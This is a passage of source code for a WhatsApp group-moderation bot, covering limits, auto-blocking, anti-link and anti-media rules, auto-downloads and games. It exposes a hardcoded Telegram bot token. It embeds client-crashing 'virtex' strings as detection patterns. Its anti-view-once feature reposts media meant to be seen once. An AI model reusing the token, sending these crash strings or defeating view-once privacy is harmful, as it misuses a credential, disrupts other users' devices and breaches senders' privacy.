                                                    let jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8')
                                                      let exif = Buffer.concat([exifAttr, jsonBuffer])
                                                        exif.writeUIntLE(jsonBuffer.length, 14, 4)
                                                          await img.load(buffer)
                                                            img.exif = exif
                                                              return await img.save(null)
                                                              }
function makeid(length) {
  let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
  return result;
  }

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}
        
        async function Telesticker(url) {
    return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return reply('Enther your url telegram sticker link')
        packName = url.replace("https://t.me/addstickers/", "")
        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
        const xeonyresult = []
        for (let i = 0; i < data.data.result.stickers.length; i++) {
            fileId = data.data.result.stickers[i].thumb.file_id
            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
            result = {
            status: 200,
            author: 'DGXeon',
            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
            }
            xeonyresult.push(result)
        }
    resolve(xeonyresult)
    })
}

//mega download
function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';

    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));

    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

//trace anime
function formatDuration(ms) {
  let seconds = Math.floor((ms / 1000) % 60);
  let minutes = Math.floor((ms / (1000 * 60)) % 60);
  let hours = Math.floor((ms / (1000 * 60 * 60)) % 24);
  return `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
}
        
        //limit func
        async function useLimit(senuseLimitder, amount) {
            db.data.users[sender].limit -= amount
            db.data.users[sender].totalLimit += amount
            reply(`You have used up: ${amount} limit\nRemaining: ${db.data.users[sender].limit} limit`)
        }
        async function resetLimit() {
            let users = Object.keys(global.db.data.users)
            let Limitxeon = isPremium ? limit.prem : limit.free
            for (let i of users) {
               db.data.users[i].limit = Limitxeon
            }
            EliteProEmpire.sendText('120363167338947238@g.us', { text: `Reset Limit`})
        }
        // Grup Only
        if (!m.isGroup && !XeonTheCreator && db.data.settings[botNumber].onlygrub ) {
        	if (isCommand){
            return reply(`Hello buddy! Because We Want to Reduce Spam, Please Use Bot in the Group Chat !\n\nIf you have issue please chat owner wa.me/${ownernumber}`)
            }
        }
        // Private Only
        if (!XeonTheCreator && db.data.settings[botNumber].onlypc && m.isGroup) {
        	if (isCommand){
	         return reply("Hello buddy! if you want to use this bot, please chat the bot in private chat")
	     }
	}
	     
        if (!EliteProEmpire.public) {
            if (XeonTheCreator && !m.key.fromMe) return
        }
        if (db.data.settings[botNumber].online) {
        	if (isCommand) {
        	EliteProEmpire.sendPresenceUpdate('unavailable', from)
        }
        }
        if (db.data.settings[botNumber].autoread) {
            EliteProEmpire.readMessages([m.key])
        }
        //auto set bio\\
	if (db.data.settings[botNumber].autobio) {
            EliteProEmpire.updateProfileStatus(`${botname} Have Been Running For ${runtime(process.uptime())}`).catch(_ => _)
        }
     //auto type record
        if (db.data.settings[botNumber].autorecordtype){
        if (isCommand) {
            let xeonmix = ['composing', 'recording']
            xeonmix2 = xeonmix[Math.floor(xeonmix.length * Math.random())]
            EliteProEmpire.sendPresenceUpdate(xeonmix2, from)
        }
        }
        if (db.data.settings[botNumber].autorecord){
        if (isCommand) {
        	let xeonmix = ['recording']
            xeonmix2 = xeonmix[Math.floor(xeonmix.length * Math.random())]
            EliteProEmpire.sendPresenceUpdate(xeonmix2, from)
        }
        }
        if (db.data.settings[botNumber].autotype){
        if (isCommand) {
        	let xeonpos = ['composing']
            EliteProEmpire.sendPresenceUpdate(xeonpos, from)
        }
        }
        
        //auto block number
        if (m.sender.startsWith(`${autoblocknumber}`) && db.data.settings[botNumber].autoblocknum === true) {
            return EliteProEmpire.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('91') && db.data.settings[botNumber].onlyindia === true) {
            return EliteProEmpire.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('62') && db.data.settings[botNumber].onlyindo === true) {
            return EliteProEmpire.updateBlockStatus(m.sender, 'block')
        } 
        if (!m.sender.startsWith(`${antiforeignnumber}`) && db.data.chats[m.chat].antiforeignnum === true){ 
        	if (XeonTheCreator || isAdmins || !isBotAdmins) return
            EliteProEmpire.sendMessage(m.chat, { text: `Sorry buddy! you will be removed because the group admin/owner has enabled anti foreign number, only +${antiforeignnumber} country code is allowed to join the group` }, {quoted: m})
            await sleep(2000)
            await EliteProEmpire.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        let list = []
for (let i of owner) {
list.push({
	    	displayName: await EliteProEmpire.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await EliteProEmpire.getName(i)}\nFN:${await EliteProEmpire.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
        //console log
        if (isCommand) {
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
            console.log(chalk.black(chalk.bgWhite(!isCommand ? '[ MESSAGE ]' : '[ COMMAND ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
            global.db.data.settings[botNumber].totalhit += 1
        }
//Chinedu-MD Fix (2)
// Call auto-react function on every message
elitereact(m);

        //antiviewonce
    if ( db.data.chats[m.chat].antiviewonce && m.isGroup && m.mtype == 'viewOnceMessageV2') {
        let val = { ...m }
        let msg = val.message?.viewOnceMessage?.message || val.message?.viewOnceMessageV2?.message
        delete msg[Object.keys(msg)[0]].viewOnce
        val.message = msg
        await EliteProEmpire.sendMessage(m.chat, { forward: val }, { quoted: m })
    }
    
    //antispam kick
if (db.data.chats[m.chat].antispam) {
if (m.isGroup && m.message && xeon_antispam.isFiltered(from)) {
console.log(`[SPAM]`, color(moment(m.messageTimestamp * 100).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName))
return await EliteProEmpire.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}
    
    // Anti promotion
if (db.data.chats[m.chat].antipromotion) {
if (budy.match(`instagram booster|tiktok booster|ml booster|bgmi selling|selling uc|selling diamonds|selling coin|selling id|selling account|selling ids|buy account|sell account|buy id|sell id|instagram followers|tiktok followers|buy panel|sell panel|sell bug bot|buy bug bot|buy bot bug|sell bot bug|adminpanel5kpm|open jasa push member grup|yangmaubuypanelpm|admin panel 10k pm|Hanya menyediakan Jasa Push Member Grup|admin panel 5k pm|yang mau beli panel murah pm|list harga panel by|list harga vps|LIST HARGA VPS|OPEN JASA PUSH MEMBER GRUP|READY|Redy|LIST HARGA PANEL BY|list harga panel|menyediakan|MENYEDIAKAN|OPEN MURBUG|open|OPEN|PANEL READY|PANEL|PANNEL READY|panel|panel ready|pannel ready minat pm|mau panel pm|MAU PANNEL PM|Admin panel ready|ADMIN PANEL READY|Chat aja om ready selalu|OPEN JASA INSTALL|open jasa installMENYEDIAKAN JASA INSTALL|menyediakan jasa install`)) {
if (!isBotAdmins) return
if(XeonTheCreator) return
if (isAdmins) return
EliteProEmpire.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
EliteProEmpire.sendMessage(from, {text:`\`\`\`「 Promotion Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a promotion message and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
}
}

        //ANTI VIRUS
if (isGroup && db.data.chats[m.chat].antivirtex) {
if (budy.includes('๒๒๒๒') || budy.includes('ดุ') || budy.includes('ผิดุท้เึางืผิดุท้เึางื') || budy.includes('๑๑๑๑๑๑๑๑') || budy.includes('৭৭৭৭৭৭৭৭') || budy.includes('   ⃢   ⃢   ⃢  ') || budy.includes('*⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟') || budy.includes('ผดิทุเ้ึางผืดิทุเ้') || budy.includes('.*࡞ࣰࣰࣰࣲࣲࣲࣲࣩࣩࣩࣩࣶࣶ࣯࣯࣮࣮ࣦ࣯ࣨࣨࣨࣻࣻࣻࣼࣼࣼࣽࣽࣾࣷࣵࣴ࣬࣬࣬ࣤࣤࣧࣧ*') || budy.includes('᥋') || budy.includes('؁') || budy.includes('ٯٯٯٯٯ') ) {
if (isGroupAdmins) return reply('*VIRTEX DETECTED*')
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
EliteProEmpire.sendText(m.chat, `*MARK AS READ*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n *Virus sender here👇:* \nwa.me/${sender.split("@")[0]}`)   
if (!isBotAdmins) return
if(XeonTheCreator) return
EliteProEmpire.groupParticipantsUpdate(from, [sender], 'remove')
await EliteProEmpire.sendMessage(from, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
EliteProEmpire.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/${sender.split("@")[0]} Detected Having Sent Virtex ${isGroup?`in ${groupName}`:''}`})
 }
 }
 
 if (db.data.chats[m.chat].antibot) {
    if (m.isBaileys && m.fromMe == false){
        if (isAdmins || !isBotAdmins){		  
        } else {
          reply(`*Another Bot Detected*\n\nHusshhh Get away from this group!!!`)
    return await EliteProEmpire.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
    }
   }
 
        //anti media
        if (db.data.chats[m.chat].antimedia && isMedia) {
        if (XeonTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Media Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-media for this group`)
    return EliteProEmpire.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
  }
        if (db.data.chats[m.chat].image && isEliteProMedia) {
    if(isEliteProMedia === "imageMessage"){
        if (XeonTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Image Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-image for this group`)
    return EliteProEmpire.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antivideo && isEliteProMedia) {
    if(isEliteProMedia === "videoMessage"){
        if (XeonTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Video Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-video for this group`)
    return EliteProEmpire.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antisticker && isEliteProMedia) {
    if(isEliteProMedia === "stickerMessage"){
        if (XeonTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Sticker Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-sticker for this group`)
    return EliteProEmpire.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antiaudio && isEliteProMedia) {
    if(isEliteProMedia === "audioMessage"){
        if (XeonTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Audio Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-audio for this group`)
    return EliteProEmpire.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antipoll && isEliteProMedia) {
    if(isEliteProMedia === "pollCreationMessage"){
        if (XeonTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Poll Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-poll for this group`)
    return EliteProEmpire.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antilocation && isEliteProMedia) {
    if(isEliteProMedia === "locationMessage"){
        if (XeonTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Location Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-location for this group`)
    return EliteProEmpire.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antidocument && isEliteProMedia) {
    if(isEliteProMedia === "documentMessage"){
        if (XeonTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Document Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-document for this group`)
    return EliteProEmpire.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
      if (db.data.chats[m.chat].anticontact && isEliteProMedia) {
    if(isEliteProMedia === "contactMessage"){
        if (XeonTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Contact Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-contact for this group`)
    return EliteProEmpire.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        //respond
        if (db.data.chats[m.chat].badword) {
            for (let bak of bad) {
               if (budy === bak) {
                  let baduser = await db.data.users[sender].badword
                  EliteProEmpire.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			EliteProEmpire.sendMessage(from, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} was using harsh words and his chat has been deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
               }
            }
        }
        //auto download #ctto
        if (db.data.settings[botNumber].autodownload && !m.key.fromMe && !isCmd2) {
try {
if (budy.match(`instagram.com`)) {
await EliteProEmpire.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/instagram?url=${budy}`)
EliteProEmpire.sendMessage(m.chat, { video: { url: anu.result.media}, caption: `Auto Download ✅`}, {quoted: m})
await EliteProEmpire.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`tiktok.com`)) {
await EliteProEmpire.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/tiktok?url=${budy}`)
EliteProEmpire.sendMessage(m.chat, { video: { url: anu.result.Medium.url}, caption: `Auto Download ✅`}, {quoted: m})
await EliteProEmpire.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`facebook.com`)) {
await EliteProEmpire.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/facebook?url=${budy}`)
EliteProEmpire.sendMessage(m.chat, { video: { url: anu.result.video_sd}, caption: `Auto Download ✅`}, {quoted: m})
await EliteProEmpire.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`youtube.com|youtu.be`)) {
await EliteProEmpire.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/ytmp4?url=${budy}`)
EliteProEmpire.sendMessage(m.chat, { video: { url: anu.result.result}, caption: ``}, {quoted: m})
await EliteProEmpire.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} 
} catch (err) {
await EliteProEmpire.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
} 
        
        //autosticker
        if (db.data.settings[botNumber].autosticker) {
        	if (m.key.fromMe) return
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                EliteProEmpire.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                EliteProEmpire.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
        
        if (db.data.chats[m.chat].antilinkgc) {
            if (budy.match(`chat.whatsapp.com`)) {
               bvl = `\`\`\`「 GC Link Detected 」\`\`\`\n\nAdmin just sent a gc link..`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (XeonTheCreator) return reply(bvl)
               await EliteProEmpire.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			EliteProEmpire.sendMessage(from, {text:`\`\`\`「 GC Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} *_Waring gc link not allowed in current group._*`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        if (db.data.chats[m.chat].antilink) {
            if (budy.match('http') && budy.match('https')) {
               bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin just sent a link..`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (XeonTheCreator) return reply(bvl)
               await EliteProEmpire.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			EliteProEmpire.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} *_Waring link not allowed in current group._*`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        //afk
        let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	     for (let jid of mentionUser) {
            let user = db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            reply(`Please Don't Tag Him\nHe's AFK ${reason ? 'With reason ' + reason : 'no reason'}\nAfk Since ${clockString(new Date - afkTime)}`.trim())
        }
        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            reply(`You Have Returned From AFK\nAFK Reason: ${user.afkReason ? user.afkReason : ''}\nAFK Duration: ${clockString(new Date - user.afkTime)}`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
        
//total features
const xeonfeature = () =>{
            var mytext = fs.readFileSync("./ElitePro.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
        //aatus
        try {
  const textLower = m.text.toLowerCase();
  if (textLower === 'download' || textLower === 'statusdown' || textLower === 'take' || textLower === 'send') {
    const quotedMessage = m.msg.contextInfo.quotedMessage;
    if (quotedMessage) {
      if (quotedMessage.imageMessage) {
        let imageCaption = quotedMessage.imageMessage.caption;
        let imageUrl = await EliteProEmpire.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
        EliteProEmpire.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
        reply('*Downloading status...*');
      }
      if (quotedMessage.videoMessage) {
        let videoCaption = quotedMessage.videoMessage.caption;
        let videoUrl = await EliteProEmpire.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
        EliteProEmpire.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
        reply('*Downloading status...*');
      }
    }
  }
} catch (error) {
  console.error("Error in 'send message' handling:", error);
}
        //autoreply
for (let BhosdikaXeon of VoiceNoteXeon) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./EliteProMedia/audio/${BhosdikaXeon}.mp3`)
EliteProEmpire.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of StickerXeon){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./EliteProMedia/sticker/${BhosdikaXeon}.webp`)
EliteProEmpire.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageXeon){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./EliteProMedia/image/${BhosdikaXeon}.jpg`)
EliteProEmpire.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoXeon){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./EliteProMedia/video/${BhosdikaXeon}.mp4`)
EliteProEmpire.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
EliteProEmpire.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaXeon of ApkXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./EliteProMedia/apk/${BhosdikaXeon}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
EliteProEmpire.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaXeon of ZipXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./EliteProMedia/zip/${BhosdikaXeon}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
EliteProEmpire.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaXeon of DocXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./EliteProMedia/doc/${BhosdikaXeon}.pdf`)
senddocu(buffer)
}
}

// Response Addlist
if (m.isGroup && isAlreadyResponList(from, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(from, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
EliteProEmpire.sendMessage(from, { text: sendResponList(from, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
EliteProEmpire.sendMessage(from, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
} 
}

//okhere
// Ensure global.db.data.sticker is initialized
if (!global.db.data.sticker) {
  global.db.data.sticker = {};
}

// Respon Cmd with media
if (m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
  let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')];
  let { text, mentionedJid } = hash;
  let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
    userJid: EliteProEmpire.user.id,
    quoted: m.quoted && m.quoted.fakeObj
  });
  messages.key.fromMe = areJidsSameUser(m.sender, EliteProEmpire.user.id);
  messages.key.id = m.key.id;
  messages.pushName = m.pushName;
  if (m.isGroup) messages.participant = m.sender;
  let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
  };
  EliteProEmpire.ev.emit('messages.upsert', msg);
}


//============= [LIST RESPONCE CHECKING START ]================
        if(m.mtype === "interactiveResponseMessage"){
            console.log("interactiveResponseMessage Detected!")   
            let msg = m.message[m.mtype]  || m.msg
            if(msg.nativeFlowResponseMessage  && !m.isBot  ){ 
                let { id } = JSON.parse(msg.nativeFlowResponseMessage.paramsJson) || {}  
                if(id){
                    let emit_msg = { 
                        key : { ...m.key } , // SET RANDOME MESSAGE ID  
                        message:{ extendedTextMessage : { text : id } } ,
                        pushName : m.pushName,
                        messageTimestamp  : m.messageTimestamp || 754785898978
                    }
                    return EliteProEmpire.ev.emit("messages.upsert" , { messages : [ emit_msg ] ,  type : "notify"})
                }
            }
        }
//============= [LIST RESPONCE CHECKING END ]================


//math
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
	if (m.key.fromMe) return
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await reply(`🎮 Math Quiz 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Send ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }
        
        //game
        this.game = this.game ? this.game : {}
        let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
        if (room) {
            let ok
            let isWin = !1
            let isTie = !1
            let isSurrender = !1
            // reply(`[DEBUG]\n${parseInt(m.text)}`)
            if (!/^([1-9]|(me)?giveup|surr?ender|off|skip)$/i.test(m.text)) return
            isSurrender = !/^[1-9]$/.test(m.text)
            if (m.sender !== room.game.currentTurn) {
                if (!isSurrender) return !0
            }
            if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
                reply({
                    '-3': 'The game is over',
                    '-2': 'Invalid',
                    '-1': 'Invalid Position',
                    0: 'Invalid Position',
                } [ok])
                return !0
            }
            if (m.sender === room.game.winner) isWin = true
            else if (room.game.board === 511) isTie = true
            let arr = room.game.render().map(v => {
                return {
                    X: '❌',
                    O: '⭕',
